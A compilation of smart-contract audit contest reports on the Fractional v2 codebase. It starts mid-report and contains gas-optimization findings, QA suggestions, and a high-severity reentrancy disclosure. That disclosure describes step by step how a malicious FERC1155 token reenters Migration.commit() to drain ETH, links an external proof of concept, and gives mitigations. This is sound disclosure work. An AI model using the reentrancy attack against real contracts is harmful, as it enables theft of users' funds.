newTotalSupply) /             totalInEth;          );     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 435](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L435) SLOAD 2: [line 467](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L467) SLOAD 3: [line 470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L470)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 101 gas) File:Migration.sol [line 184,200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L179-L214)  ```     function commit(address _vault, uint256 _proposalId)         external         returns (bool started)     {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         // Calculates current price of the proposal based on total supply         uint256 currentPrice = _calculateTotal(             100,             IVaultRegistry(registry).totalSupply(_vault),             proposal.totalEth,             proposal.totalFractions         );      } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L184) SLOAD 2: [line 200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L200)   #### Buyout.sol.start() : registry should be cached (saves ~ 83 gas) File:Buyout.sol [line 61-71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L57-L73)  ```     function start(address _vault) external payable {                 // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );        ...         // Gets total supply of fractional tokens for the vault         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         // Gets total balance of fractional tokens owned by caller         uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id); ```  In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 61](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L61) and the SLOAD 2:  [line 71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L71)  #### Buyout.sol.cash() : registry should be cached (saves ~ 84 gas) File: Buyout.sol [line 246-267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244-L273)  ```     function cash(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );       ...         // Transfers buyout share amount to caller based on total supply         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         uint256 buyoutShare = (tokenBalance * ethBalance) /             (totalSupply + tokenBalance);         _sendEthOrWeth(msg.sender, buyoutShare);         // Emits event for cashing out of buyout pool         emit Cash(_vault, msg.sender, buyoutShare);     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 246](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L246) and the SLOAD 2:  [line 267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L267)  #### Buyout.sol.redeem() : registry should be cached (saves ~97 gas) File: Buyout.sol [line 280-288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L278-L288)  ```     function redeem(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not inactive         (, , State current, , , ) = this.buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert InvalidState(required, current);           // Initializes vault transaction         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1 : [line 280](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L280) and the SLOAD 2 : [line 288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L288)   #### FERC1155.sol.uri() : metadata[\_uri] should be cached File: FERC1155.sol [line 297-298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L299)  ```     function uri(uint256 _id)         public         view         override(ERC1155, IFERC1155)         returns (string memory)     {         require(metadata[_id] != address(0), "NO METADATA"); @audit : SLOAD 1 metadata[_id]         return IFERC1155(metadata[_id]).uri(_id);@audit : SLOAD 2 metadata[_id]     } ``` SLOAD 1:  in the require statement [line 297](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297) costing 100 gas  SLOAD 2:  in the return statement [line 298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L298) again costing 100gas  We can cache `metadata[_id]` in memory and read the value from memory instead of from storage    ### Help the optimizer by saving a storage variable's reference instead of repeatedly fetching migrationInfo[\_vault][\_proposalId] Declare a **Storage**  variable and use it instead of fetching the reference in the map repeatedly.  Instead of calling `migrationInfo[_vault][_proposalId]` everytime save it's reference like shown below and use the reference.  ```   Proposal storage proposal = migrationInfo[_vault][_proposalId]; ``` File: Migration.sol [line 454-456](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L468)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {               // Calculates the total ether amount of a successful proposal         uint256 totalInEth = _calculateTotal(             1 ether,             lastTotalSupply,             migrationInfo[_vault][_proposalId].totalEth,             migrationInfo[_vault][_proposalId].totalFractions         );         // Calculates balance of caller based on ether contribution         uint256 balanceContributedInEth = _calculateContribution(             totalInEth,             lastTotalSupply,             userProposalEth[_proposalId][msg.sender],             userProposalFractions[_proposalId][msg.sender]         );          // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         ``` In the above function, `migrationInfo[_vault][_proposalId]` is being fetched 3 times  in the following lines  1: [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L454) 2: [line 455](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L455) 3: [line 466](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L466)  Something similar to my proposal has already been implemented on [line 266](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L266)   ### Cache the length of arrays in loops (saves ~6 gas per iteration) Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:  File: MerkleBase.sol [line 51](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51)  ```             for (uint256 i = 0; i < _proof.length; ++i) { ```  **The above should be modified to** ```      uint256 length = _proof.length;             for (uint256 i = 0; i < length; ++i) { ```  **Other instances to modify** File: MerkleBase.sol [line 110](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110)  ```             for (uint256 i; i < result.length; ++i) { ```  File: BaseVault.sol [line 64](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L64)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L83)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 107](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L107)  ```             for (uint256 i = 0; i < _tokens.length; ++i) { ```  File: BaseVault.sol  [line 130](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L130)  ```             for (uint256 i; i < _modules.length; ++i) { ```  File: BaseVault.sol  [line 132](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L132)  ```                 for (uint256 j; j < leaves.length; ++j) { ```  File: Buyout.sol [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)  ```         for (uint256 i; i < permissions.length; ) { ```  File: MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  The following shows all instances where `_data.length` is being accessed in the function **getProof()**  ```         require(_data.length > 1, "wont generate proof for single leaf"); ``` ```         uint256 size = log2ceil_naive(_data.length); ``` ```         while (_data.length > 1) { ``` ```        } else if (_node + 1 == _data.length) { ```  ### ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ``` uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  **Instances include:** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{    ++i;    }         } ```  File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ```  ### use shorter revert strings(less than 32 bytes)  Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  File: MerkleBase.sol [line 62](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62)  ```         require(_data.length > 1, "wont generate root for single leaf"); ```  **Other instances to modify** File MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  ```         require(_data.length > 1, "wont generate proof for single leaf"); ```  I suggest shortening the revert strings to fit in 32 bytes, or using custom errors.  ### Use Custom Errors instead of Revert Strings to save Gas Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  see [Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)     Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  **Instances to modify**  File: FERC1155.sol [line 263-268](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L268)  ```         require(             msg.sender == _from ||                 isApprovedForAll[_from][msg.sender] ||                 isApproved[_from][msg.sender][_id],             "NOT_AUTHORIZED"         ); ```  File: FERC1155.sol [line 275](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L275)  ```         require( _to.code.length == 0 ? _to != address(0) : INFTReceiver(_to).onERC1155Received( msg.sender, _from, _id, _amount, _data ) == INFTReceiver.onERC1155Received.selector, "UNSAFE_RECIPIENT" );    ```  File: FERC1155.sol  [line 297](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297)  ```         require(metadata[_id] != address(0), "NO METADATA"); ```   ### Use Shift Right/Left instead of Division/Multiplication A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  [relevant source](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible)  File: MerkleBase.sol [line 100](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100)  ```                 _node = _node / 2; ```  The above should be modified to  ```   _node = _node >> 1    ```  File: MerkleBase.sol [line 142](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L142) ```                 result = new bytes32[](length / 2); ```  ### Expressions for constant values such as a call to keccak256(), should use immutable rather than constant  Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was immutable instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.   **consequences:** -  Each usage of a "constant" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..)  -  Since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )   See: ethereum/solidity#9232  File: Permit.sol [line 5](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L5)  ``` bytes32 constant DOMAIN_TYPEHASH = keccak256(     "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" ); ```  File: Permit.sol [line 10](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L10)  ``` bytes32 constant PERMIT_TYPEHASH = keccak256(     "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" ); ``` File: Permit.sol  [line 15](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/constants/Permit.sol#L15)  ``` bytes32 constant PERMIT_ALL_TYPEHASH = keccak256(     "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" ); ```  ### constants should be defined rather than using magic numbers There are several occurrences of literal values with unexplained meaning .Literal values in the codebase without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike.  Developers should define a constant variable for every magic value used , giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity’s style guide](https://solidity.readthedocs.io/en/latest/style-guide.html#constants), constants should be named in UPPER_CASE_WITH_UNDERSCORES format, and specific public getters should be defined to read each one of them.  File: Buyout.sol [line 209](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L209)  ```             (tokenBalance * 1000) / ```  File: Buyout.sol [line 211](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L211)  ```             500 ```  File: Buyout.sol [line 86-87](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86-L87)  ```         uint256 buyoutPrice = (msg.value * 100) /             (100 - ((depositAmount * 100) / totalSupply)); ```  File: FERC1155.sol [line 247](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L247)  ```         royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; ```  ### Using Private Rather than Public for constants saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non payable getter functions for deployment  calldata, and not adding another entry to the method ID table   File: FERC1155.sol [line 15](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L15)  ```     string public constant NAME = "FERC1155"; ```  File: FERC1155.sol [line 17](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L17)  ```     string public constant VERSION = "1"; ```  File: Buyout.sol [line 35](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L35)  ```     uint256 public constant PROPOSAL_PERIOD = 2 days; ```  File: Buyout.sol  [line 37](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L37)  ```     uint256 public constant REJECTION_PERIOD = 4 days; ```  File: Migration.sol [line 43](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L43)  ```     uint256 public constant PROPOSAL_PERIOD = 7 days; ```  ### Use CALLDATA Instead of Memory  File: FERC1155.sol [line 68-72](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68-L72)    When arguments are read only on external functions, the data location should be calldata avoiding the cost of allocating memory or storage.   ```     function emitSetURI(uint256 _id, string memory _uri) external {         if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);         emit URI(_uri, _id);     } ``` `string memory _uri` should be modified to `string calldata _uri`  File: FERC1155.sol [line 79-87](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L79-L87)  ```     function mint(         address _to,         uint256 _id,         uint256 _amount,         bytes memory _data     ) external onlyRegistry {         _mint(_to, _id, _amount, _data);         totalSupply[_id] += _amount;     } ``` Since `_data` is only being read and not modified here, we can modify our `bytes memory _data` to `bytes calldata _data`  File: Metadata.sol [line 24-31](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24-L31)  ```     function setURI(uint256 _id, string memory _uri) external {         address controller = IFERC1155(token).controller();         if (msg.sender != controller)             revert IFERC1155.InvalidSender(controller, msg.sender);           tokenMetadata[_id] = _uri;         IFERC1155(token).emitSetURI(_id, _uri);     } ```  Since `_uri` is only being read we can use calldata instead of memory :  from `string memory _uri` to `string calldata _uri`  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L207-L212   # Vulnerability details  ## Impact  HIGH - Assets can be compromised directly. One can drain eth out from migration module to buyout module using custom made FERC1155 token.  ## Proof of Concept  - [proof of concept: `testCommitReenter_poc`](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L283-L339) - [custom made FERC1155 for the attack](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L6-L63)  The proof of concept shows a scenario where alice is draining migration module using custom made FERC1155 token.  1. setup: other people are using migration module and they deposited some eth. (using alice and bob just to simplify the set up process) 2. alice prepared the custom FERC1155 (let's say `evil_token`) 3. alice create a vault with the `evil_token` 4. alice proposes and joins with 0.5 ether 5. when alice calls `commit`, the `evil_token` will reenter `commit` and send money to buyout module  Note: For a simplicity, the `evil_token` reenters for a fixed number of times. But one can adjust to drain all the eth in the migration module. Note2: For now the eth is in the buyout module, but given the current implementation of `buyout` module, the same actor can drain eth from buyout.  The `commit` function is not written in Checks, Effects, Interactions (CEI) patterns.   ```solidity // modules/Migration.sol::commit // proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor) // Mitigation idea: set the values before the out going calls  206         if (currentPrice > proposal.targetPrice) { 207             // Sets token approval to the buyout contract 208             IFERC1155(token).setApprovalFor(address(buyout), id, true); 209             // Starts the buyout process 210             IBuyout(buyout).start{value: proposal.totalEth}(_vault); 211             proposal.isCommited = true; 212             started = true; 213         } ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Follow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.      
### 1. Unused interface imports  - The interfaces `(IERC1155, IERC20, IERC1155)` imported in [`Transfer.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L4-L6) is not used anywhere inside the contract.   ### 2. Address(0) checks  - It is best practice to add guard checks for address(0) in important settings like constructors. - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18)  ### 3. Unhandeled return value - It is recommended to add `require()` to the boolean return values.  - [execute()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L60) returns boolean values.    ### 4. Unused receive() function will lock ether in contract  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53    ### 5. Less external call be made by calling the token contract's methods directly  - In [start()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L57) function of `Buyout.sol`, while calulating `totalSupply` of vault `IVaultRegistry(registry).totalSupply(_vault)`.  This could be calculated directly by calling `FERC1155(token).totalSupply(id)` directly which will make one less external call.   ```solidity  // before (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); .... uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ....   // After  .... (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); ......... uint256 totalSupply = IERC1155(token).totalSupply(id);   ```   ### 6. Defined error is not used  - [`error MethodNotFound()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L11) in `IVault.sol` is not used in the inherited contracts.    ### 7. Use a single modifier instead of using the same guard checks multiple times - [`if (owner != msg.sender) revert NotOwner(owner, msg.sender)`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87) is used in multiple methods inside `vault.sol`. It is recommended to use a single modifer for better code resue.   ### 8. Use two-step process for transfering ownership  - Unrecoverable critical process like [`transferOwnership()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) could use two step process to prevent unintended mistakes.  - same for [`transferController()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229) -  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured.  ### 9. Use modifier to check the vault status - There are several instances where a function needs to revert unless the vault is at a certain state. This code is repeated throught several functions. - This can be refactored into a single modifier to make the code look nice and more readable.  for eg. ```solidity      modifier vaultState(address _vault, State required) {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not successful         (, , State current, , , ) = this.buyoutInfo(_vault);         if (current != required) revert InvalidState(required, current);     } ```  Now this modifier can be used in any function that needs to check the vault is in a certain state before performing certain actions.  for eg, lets use function `porpose` of `Migration.sol`  ```solidity     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external vaultState(_vault, State.INACTIVE) {     ...     ...     }
# [G-01] Redundant zero initialization  Solidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L51  ## Recommended Mitigation Steps  Remove the redundant zero initialization `uint256 i;` instead of `uint256 i = 0;`  # [G-02] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L130 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L132  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-03] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L186  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-04] Short require strings save gas  Strings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62  ## Recommended Mitigation Steps  Shorten all require strings to less than 32 characters  # [G-05] Use prefix not postfix in loops  Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Use prefix not postfix to increment in a loop  # [G-06] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L450 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L487 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L101 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L61 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L125 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L112 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L114 